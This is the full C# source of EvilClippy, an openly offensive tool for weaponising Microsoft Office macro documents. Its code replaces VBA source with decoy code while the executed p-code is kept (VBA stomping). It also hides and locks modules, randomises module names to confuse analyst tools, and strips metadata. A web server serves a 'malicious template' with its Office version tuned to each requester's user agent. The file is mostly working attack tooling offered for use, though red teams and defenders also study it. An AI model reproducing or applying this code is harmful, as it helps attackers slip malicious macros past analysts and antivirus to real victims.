// EvilClippy 
// Cross-platform CFBF and MS-OVBA manipulation assistant
//
// Author: Stan Hegt (@StanHacked) / Outflank
// Date: 20190330
// Version: 1.1 (added support for xls, xlsm and docm)
//
// Special thanks to Carrie Robberts (@OrOneEqualsOne) from Walmart for her contributions to this project.
//
// Compilation instructions
// Mono: mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 
// Visual studio developer command prompt: csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs 

using System;
using OpenMcdf;
using System.Text;
using System.Collections.Generic;
using Kavod.Vba.Compression;
using System.Linq;
using NDesk.Options;
using System.Net;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Text.RegularExpressions;

public class MSOfficeManipulator
{
	// Verbosity level for debug messages
	static int verbosity = 0;

	// Filename of the document that is about to be manipulated
	static string filename = "";

        // Name of the generated output file.
        static string outFilename = "";
    
	// Compound file that is under editing
	static CompoundFile cf;

	// Byte arrays for holding stream data of file
	static byte[] vbaProjectStream;
	static byte[] dirStream;
	static byte[] projectStream;

	static public void Main(string[] args)
	{
		// List of target VBA modules to stomp, if empty => all modules will be stomped
		List<string> targetModules = new List<string>();

		// Filename that contains the VBA code used for substitution
		string VBASourceFileName = "";

		// Target MS Office version for pcode
		string targetOfficeVersion = "";

		// Option to hide modules from VBA editor GUI
		bool optionHideInGUI = false;

		// Option to start web server to serve malicious template
		int optionWebserverPort = 0;

		// Option to display help
		bool optionShowHelp = false;

		// File format is OpenXML (docm or xlsm)
		bool is_OpenXML = false;

		// Option to delete metadata from file
		bool optionDeleteMetadata = false;

		// Option to set random module names in dir stream
		bool optionSetRandomNames = false;

        // Option to set locked/unviewable options in Project Stream
        bool optionUnviewableVBA = false;

        // Option to set unlocked/viewable options in Project Stream
        bool optionViewableVBA = false;

        // Temp path to unzip OpenXML files to
        String unzipTempPath = "";


		// Start parsing command line arguments
		var p = new OptionSet() {
			{ "n|name=", "The target module name to stomp.\n" +
				"This argument can be repeated.",
				v => targetModules.Add (v) },
			{ "s|sourcefile=", "File containing substitution VBA code (fake code).",
				v => VBASourceFileName = v },
			{ "g|guihide", "Hide code from VBA editor GUI.",
				v => optionHideInGUI = v != null },
			{ "t|targetversion=", "Target MS Office version the pcode will run on.",
				v => targetOfficeVersion = v },
			{ "w|webserver=", "Start web server on specified port to serve malicious template.",
				(int v) => optionWebserverPort = v },
			{ "d|delmetadata", "Remove metadata stream (may include your name etc.).",
				v => optionDeleteMetadata = v != null },
			{ "r|randomnames", "Set random module names, confuses some analyst tools.",
				v => optionSetRandomNames = v != null },
            { "u|unviewableVBA", "Make VBA Project unviewable/locked.",
                v => optionUnviewableVBA = v != null },
            { "uu|viewableVBA", "Make VBA Project viewable/unlocked.",
                v => optionViewableVBA = v != null },
            { "v", "Increase debug message verbosity.",
				v => { if (v != null) ++verbosity; } },
			{ "h|help",  "Show this message and exit.",
				v => optionShowHelp = v != null },
		};

		List<string> extra;
		try
		{
			extra = p.Parse(args);
		}
		catch (OptionException e)
		{
			Console.WriteLine(e.Message);
			Console.WriteLine("Try '--help' for more information.");
			return;
		}

		if (extra.Count > 0)
		{
			filename = string.Join(" ", extra.ToArray());
		}
		else
		{
			optionShowHelp = true;
		}

		if (optionShowHelp)
		{
			ShowHelp(p);
			return;
		}
		// End parsing command line arguments

		// OLE Filename (make a copy so we don't overwrite the original)
		outFilename = getOutFilename(filename);
		string oleFilename = outFilename;

		// Attempt to unzip as docm or xlsm OpenXML format
		try
		{
			unzipTempPath = CreateUniqueTempDirectory();
			ZipFile.ExtractToDirectory(filename, unzipTempPath);
			if (File.Exists(Path.Combine(unzipTempPath, "word", "vbaProject.bin"))) { oleFilename = Path.Combine(unzipTempPath, "word", "vbaProject.bin"); }
			else if (File.Exists(Path.Combine(unzipTempPath, "xl", "vbaProject.bin"))) { oleFilename = Path.Combine(unzipTempPath, "xl", "vbaProject.bin"); }
			is_OpenXML = true;
		}
		catch (Exception)
		{
			// Not OpenXML format, Maybe 97-2003 format, Make a copy
			if (File.Exists(outFilename)) File.Delete(outFilename);
			File.Copy(filename, outFilename);
		}

		// Open OLE compound file for editing
		try
		{
			cf = new CompoundFile(oleFilename, CFSUpdateMode.Update, 0);
		}
		catch (Exception e)
		{
			Console.WriteLine("ERROR: Could not open file " + filename);
			Console.WriteLine("Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.");
			Console.WriteLine();
			Console.WriteLine(e.Message);
			return;
		}

        // Read relevant streams
        CFStorage commonStorage = cf.RootStorage; // docm or xlsm
		if (cf.RootStorage.TryGetStorage("Macros") != null) commonStorage = cf.RootStorage.GetStorage("Macros"); // .doc
		if (cf.RootStorage.TryGetStorage("_VBA_PROJECT_CUR") != null) commonStorage = cf.RootStorage.GetStorage("_VBA_PROJECT_CUR"); // xls		
		vbaProjectStream = commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").GetData();
		projectStream = commonStorage.GetStream("project").GetData();
		dirStream = Decompress(commonStorage.GetStorage("VBA").GetStream("dir").GetData());

		// Read project stream as string
		string projectStreamString = System.Text.Encoding.UTF8.GetString(projectStream);

		// Find all VBA modules in current file
		List<ModuleInformation> vbaModules = ParseModulesFromDirStream(dirStream);

		// Write streams to debug log (if verbosity enabled)
		DebugLog("Hex dump of original _VBA_PROJECT stream:\n" + Utils.HexDump(vbaProjectStream));
		DebugLog("Hex dump of original dir stream:\n" + Utils.HexDump(dirStream));
		DebugLog("Hex dump of original project stream:\n" + Utils.HexDump(projectStream));

		// Replace Office version in _VBA_PROJECT stream
		if (targetOfficeVersion != "")
		{
			ReplaceOfficeVersionInVBAProject(vbaProjectStream, targetOfficeVersion);
			commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(vbaProjectStream);
		}

        //Set ProjectProtectionState and ProjectVisibilityState to locked/unviewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c
        if (optionUnviewableVBA)
        {
            string tmpStr = Regex.Replace(projectStreamString, "CMG=\".*\"", "CMG=\"\"");
            string newProjectStreamString = Regex.Replace(tmpStr, "GC=\".*\"", "GC=\"\"");
            // Write changes to project stream
            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
        }

        //Set ProjectProtectionState and ProjectVisibilityState to be viewable see https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/dfd72140-85a6-4f25-8a17-70a89c00db8c
        if (optionViewableVBA)
        {
            string tmpStr0 = Regex.Replace(projectStreamString, "CMG=\".*\"", "CMG=\"CAC866BE34C234C230C630C6\"");
            string tmpStr1 = Regex.Replace(tmpStr0, "ID=\".*\"", "ID=\"{00000000-0000-0000-0000-000000000000}\"");
            string tmpStr = Regex.Replace(tmpStr1, "DPB=\".*\"", "DPB=\"94963888C84FE54FE5B01B50E59251526FE67A1CC76C84ED0DAD653FD058F324BFD9D38DED37\"");
            string newProjectStreamString = Regex.Replace(tmpStr, "GC=\".*\"", "GC=\"5E5CF2C27646414741474\"");

            // Write changes to project stream
            commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(newProjectStreamString));
        }


        // Hide modules from GUI
        if (optionHideInGUI)
		{
			foreach (var vbaModule in vbaModules)
			{
				if ((vbaModule.moduleName != "ThisDocument") && (vbaModule.moduleName != "ThisWorkbook"))
				{
					Console.WriteLine("Hiding module: " + vbaModule.moduleName);
					projectStreamString = projectStreamString.Replace("Module=" + vbaModule.moduleName, "");
				}
			}

			// Write changes to project stream
			commonStorage.GetStream("project").SetData(Encoding.UTF8.GetBytes(projectStreamString));
		}

		// Stomp VBA modules
		if (VBASourceFileName != "")
		{
			byte[] streamBytes;

			foreach (var vbaModule in vbaModules)
			{
				DebugLog("VBA module name: " + vbaModule.moduleName + "\nOffset for code: " + vbaModule.textOffset);

				// If this module is a target module, or if no targets are specified, then stomp
				if (targetModules.Contains(vbaModule.moduleName) || !targetModules.Any())
				{
					Console.WriteLine("Now stomping VBA code in module: " + vbaModule.moduleName);

					streamBytes = commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).GetData();

					DebugLog("Existing VBA source:\n" + GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset));

					// Get new VBA source code from specified text file. If not specified, VBA code is removed completely.
					string newVBACode = "";
					if (VBASourceFileName != "")
					{
						try
						{
							newVBACode = System.IO.File.ReadAllText(VBASourceFileName);
						}
						catch (Exception e)
						{
							Console.WriteLine("ERROR: Could not open VBA source file " + VBASourceFileName);
							Console.WriteLine("Please make sure this file exists and contains ASCII only characters.");
							Console.WriteLine();
							Console.WriteLine(e.Message);
							return;
						}
					}

					DebugLog("Replacing with VBA code:\n" + newVBACode);

					streamBytes = ReplaceVBATextInModuleStream(streamBytes, vbaModule.textOffset, newVBACode);

					DebugLog("Hex dump of VBA module stream " + vbaModule.moduleName + ":\n" + Utils.HexDump(streamBytes));

					commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).SetData(streamBytes);
				}
			}
		}


		// Set random ASCII names for VBA modules in dir stream
		if (optionSetRandomNames)
		{
			Console.WriteLine("Setting random ASCII names for VBA modules in dir stream (while leaving unicode names intact).");

			// Recompress and write to dir stream
			commonStorage.GetStorage("VBA").GetStream("dir").SetData(Compress(SetRandomNamesInDirStream(dirStream)));
		}

		// Delete metadata from document
		if (optionDeleteMetadata)
		{
			try
			{
				cf.RootStorage.Delete("\u0005SummaryInformation");
			}
			catch (Exception e)
			{
				Console.WriteLine("ERROR: metadata stream does not exist (option ignored)");
				DebugLog(e.Message);
			}
		}

		// Commit changes and close file
		cf.Commit();
		cf.Close();

		// Purge unused space in file
		CompoundFile.ShrinkCompoundFile(oleFilename);

		// Zip the file back up as a docm or xlsm
		if (is_OpenXML)
		{
			if (File.Exists(outFilename)) File.Delete(outFilename);
			ZipFile.CreateFromDirectory(unzipTempPath, outFilename);
			// Delete Temporary Files
			Directory.Delete(unzipTempPath, true);
		}

		// Start web server, if option is specified
		if (optionWebserverPort != 0)
		{
			try
			{
				WebServer ws = new WebServer(SendFile, "http://*:" + optionWebserverPort.ToString() + "/");
				ws.Run();
				Console.WriteLine("Webserver starting on port " + optionWebserverPort.ToString() + ". Press a key to quit.");
				Console.ReadKey();
				ws.Stop();
				Console.WriteLine("Webserver closed. Goodbye!");
			}
			catch (Exception e)
			{
				Console.WriteLine("ERROR: could not start webserver on specified port");
				DebugLog(e.Message);
			}
		}
	}

	public static string getOutFilename(String filename)
	{
		string fn = Path.GetFileNameWithoutExtension(filename);
		string ext = Path.GetExtension(filename);
		string path = Path.GetDirectoryName(filename);
		return Path.Combine(path, fn + "_EvilClippy" + ext);
	}

	public static string CreateUniqueTempDirectory()
	{
		var uniqueTempDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()));
		Directory.CreateDirectory(uniqueTempDir);
		return uniqueTempDir;
	}

	static public byte[] SendFile(HttpListenerRequest request)
	{
		Console.WriteLine("Serving request from " + request.RemoteEndPoint.ToString() + " with user agent " + request.UserAgent);

                CompoundFile cf = null;
                try
                {
                    cf = new CompoundFile(outFilename, CFSUpdateMode.Update, 0);
                }
                catch (Exception e)
                {
                    Console.WriteLine("ERROR: Could not open file " + outFilename);
                    Console.WriteLine("Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.");
                    Console.WriteLine();
                    Console.WriteLine(e.Message);
                }
                
		CFStream streamData = cf.RootStorage.GetStorage("Macros").GetStorage("VBA").GetStream("_VBA_PROJECT");
		byte[] streamBytes = streamData.GetData();

		string targetOfficeVersion = UserAgentToOfficeVersion(request.UserAgent);

		ReplaceOfficeVersionInVBAProject(streamBytes, targetOfficeVersion);

		cf.RootStorage.GetStorage("Macros").GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(streamBytes);

		// Commit changes and close file
		cf.Commit();
		cf.Close();

                Console.WriteLine("Serving out file '" + outFilename + "'");
		return File.ReadAllBytes(outFilename);
	}

	static string UserAgentToOfficeVersion(string userAgent)
	{
		string officeVersion = "";

		// Determine version number
		if (userAgent.Contains("MSOffice 16"))
			officeVersion = "2016";
		else if (userAgent.Contains("MSOffice 15"))
			officeVersion = "2013";
		else
			officeVersion = "unknown";

		// Determine architecture
		if (userAgent.Contains("x64") || userAgent.Contains("Win64"))
			officeVersion += "x64";
		else
			officeVersion += "x86";

		DebugLog("Determined Office version from user agent: " + officeVersion);

		return officeVersion;
	}

	static void ShowHelp(OptionSet p)
	{
		Console.WriteLine("Usage: eviloffice.exe [OPTIONS]+ filename");
		Console.WriteLine();
		Console.WriteLine("Author: Stan Hegt");
		Console.WriteLine("Email: stan@outflank.nl");
		Console.WriteLine();
		Console.WriteLine("Options:");
		p.WriteOptionDescriptions(Console.Out);
	}

	static void DebugLog(object args)
	{
		if (verbosity > 0)
		{
			Console.WriteLine();
			Console.WriteLine("########## DEBUG OUTPUT: ##########");
			Console.WriteLine(args);
			Console.WriteLine("###################################");
			Console.WriteLine();
		}
	}

	private static byte[] ReplaceOfficeVersionInVBAProject(byte[] moduleStream, string officeVersion)
	{
		byte[] version = new byte[2];

		switch (officeVersion)
		{
			case "2010x86":
				version[0] = 0x97;
				version[1] = 0x00;
				break;
			case "2013x86":
				version[0] = 0xA3;
				version[1] = 0x00;
				break;
			case "2016x86":
				version[0] = 0xAF;
				version[1] = 0x00;
				break;
			case "2013x64":
				version[0] = 0xA6;
				version[1] = 0x00;
				break;
			case "2016x64":
				version[0] = 0xB2;
				version[1] = 0x00;
				break;				
			case "2019x64":
				version[0] = 0xB2;
				version[1] = 0x00;
				break;				
			default:
				Console.WriteLine("ERROR: Incorrect MS Office version specified - skipping this step.");
				return moduleStream;
		}

		Console.WriteLine("Targeting pcode on Office version: " + officeVersion);

		moduleStream[2] = version[0];
		moduleStream[3] = version[1];

		return moduleStream;
	}

	private static byte[] ReplaceVBATextInModuleStream(byte[] moduleStream, UInt32 textOffset, string newVBACode)
	{
		return moduleStream.Take((int)textOffset).Concat(Compress(Encoding.UTF8.GetBytes(newVBACode))).ToArray();
	}

	private static string GetVBATextFromModuleStream(byte[] moduleStream, UInt32 textOffset)
	{
		string vbaModuleText = System.Text.Encoding.UTF8.GetString(Decompress(moduleStream.Skip((int)textOffset).ToArray()));

		return vbaModuleText;
	}

	private static byte[] SetRandomNamesInDirStream(byte[] dirStream)
	{
		// 2.3.4.2 dir Stream: Version Independent Project Information
		// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx
		// Dir stream is ALWAYS in little endian

		int offset = 0;
		UInt16 tag;
		UInt32 wLength;

		while (offset < dirStream.Length)
		{
			tag = GetWord(dirStream, offset);
			wLength = GetDoubleWord(dirStream, offset + 2);

			// The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp
			if (tag == 9)
				wLength = 6;
			else if (tag == 3)
				wLength = 2;

			switch (tag)
			{
				case 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record
					System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
					encoding.GetBytes(Utils.RandomString((int)wLength), 0, (int)wLength, dirStream, (int)offset + 6);

					break;
			}

			offset += 6;
			offset += (int)wLength;
		}

		return dirStream;
	}

	private static List<ModuleInformation> ParseModulesFromDirStream(byte[] dirStream)
	{
		// 2.3.4.2 dir Stream: Version Independent Project Information
		// https://msdn.microsoft.com/en-us/library/dd906362(v=office.12).aspx
		// Dir stream is ALWAYS in little endian

		List<ModuleInformation> modules = new List<ModuleInformation>();

		int offset = 0;
		UInt16 tag;
		UInt32 wLength;
		ModuleInformation currentModule = new ModuleInformation { moduleName = "", textOffset = 0 };

		while (offset < dirStream.Length)
		{
			tag = GetWord(dirStream, offset);
			wLength = GetDoubleWord(dirStream, offset + 2);

			// The following idiocy is because Microsoft can't stick to their own format specification - taken from Pcodedmp
			if (tag == 9)
				wLength = 6;
			else if (tag == 3)
				wLength = 2;

			switch (tag)
			{
				case 26: // 2.3.4.2.3.2.3 MODULESTREAMNAME Record
					currentModule.moduleName = System.Text.Encoding.UTF8.GetString(dirStream, (int)offset + 6, (int)wLength);
					break;
				case 49: // 2.3.4.2.3.2.5 MODULEOFFSET Record
					currentModule.textOffset = GetDoubleWord(dirStream, offset + 6);
					modules.Add(currentModule);
					currentModule = new ModuleInformation { moduleName = "", textOffset = 0 };
					break;
			}

			offset += 6;
			offset += (int)wLength;
		}

		return modules;
	}

	public class ModuleInformation
	{
		public string moduleName; // Name of VBA module stream

		public UInt32 textOffset; // Offset of VBA source code in VBA module stream
	}

	private static UInt16 GetWord(byte[] buffer, int offset)
	{
		var rawBytes = new byte[2];

		Array.Copy(buffer, offset, rawBytes, 0, 2);
		//if (!BitConverter.IsLittleEndian) {
		//	Array.Reverse(rawBytes);
		//}

		return BitConverter.ToUInt16(rawBytes, 0);
	}

	private static UInt32 GetDoubleWord(byte[] buffer, int offset)
	{
		var rawBytes = new byte[4];

		Array.Copy(buffer, offset, rawBytes, 0, 4);
		//if (!BitConverter.IsLittleEndian) {
		//	Array.Reverse(rawBytes);
		//}

		return BitConverter.ToUInt32(rawBytes, 0);
	}

	private static byte[] Compress(byte[] data)
	{
		var buffer = new DecompressedBuffer(data);
		var container = new CompressedContainer(buffer);
		return container.SerializeData();
	}

	private static byte[] Decompress(byte[] data)
	{
		var container = new CompressedContainer(data);
		var buffer = new DecompressedBuffer(container);
		return buffer.Data;
	}
}

// Code inspiration from https://codehosting.net/blog/BlogEngine/post/Simple-C-Web-Server
// and https://docs.microsoft.com/en-us/dotnet/api/system.net.httplistener
public class WebServer
{
	private readonly HttpListener _listener = new HttpListener();
	private readonly Func<HttpListenerRequest, byte[]> _responderMethod;

	public WebServer(Func<HttpListenerRequest, byte[]> method, params string[] prefixes)
	{
		if (!HttpListener.IsSupported)
			throw new NotSupportedException("Needs Windows XP SP2, Server 2003 or later.");

		// URI prefixes are required, for example "http://localhost:8080/index/".
		if (prefixes == null || prefixes.Length == 0)
			throw new ArgumentException("prefixes");

		// A responder method is required
		if (method == null)
			throw new ArgumentException("method");

		foreach (string s in prefixes)
			_listener.Prefixes.Add(s);

		_responderMethod = method;
		_listener.Start();
	}

	public void Run()
	{
		ThreadPool.QueueUserWorkItem((o) =>
		{
			Console.WriteLine("Webserver running...");
			try
			{
				while (_listener.IsListening)
				{
					ThreadPool.QueueUserWorkItem((c) =>
					{
						var ctx = c as HttpListenerContext;
						try
						{
							byte[] buf = _responderMethod(ctx.Request);
							ctx.Response.ContentLength64 = buf.Length;
							ctx.Response.OutputStream.Write(buf, 0, buf.Length);
						}
						catch { } // suppress any exceptions
						finally
						{
							// always close the stream
							ctx.Response.OutputStream.Close();
						}
					}, _listener.GetContext());
				}
			}
			catch { } // suppress any exceptions
		});
	}

	public void Stop()
	{
		_listener.Stop();
		_listener.Close();
	}
}
